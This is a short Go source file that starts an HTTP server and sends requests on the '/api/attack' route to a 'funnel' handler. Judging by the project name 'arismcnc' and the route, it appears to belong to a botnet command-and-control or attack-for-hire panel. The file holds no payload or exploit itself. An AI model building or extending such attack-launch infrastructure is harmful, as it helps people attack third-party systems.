package handlers

import (
	"arismcnc/database"
	"arismcnc/managers"
	"arismcnc/utils"
	"log"
	"net/http"
	"strings"
)

var db *database.Database

// StartHTTPServer launches the API funnel HTTP server
func StartHTTPServer() {
	config, err := utils.LoadConfig("assets/config.json")
	if err != nil {
		log.Printf("failed to load config for HTTP server: %v", err)
		return
	}

	db, err = database.ConnectDB(config)
	if err != nil {
		log.Printf("failed to connect to database for HTTP server: %v", err)
		return
	}

	http.HandleFunc("/api/attack", createFunnelHandler(db))
	serverAddr := ":" + config.Funnel_port

	publicIP, err := utils.GetPublicIP()
	if err != nil {
		log.Printf("Error getting public IP address: %v", err)
	}
	log.Printf("\033[32mSuccessfully\033[0m started HTTP server (%s:%s)", strings.TrimSpace(publicIP), serverAddr)

	if err := http.ListenAndServe(serverAddr, nil); err != nil {
		log.Printf("[!] Funnel server failed: %v", err)
	}
}

func createFunnelHandler(db *database.Database) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		config, err := utils.LoadConfig("assets/config.json")
		if err != nil {
			log.Printf("failed to load config: %v", err)
			return
		}
		managers.FunnelCreate(w, r, db, config)
	}
}
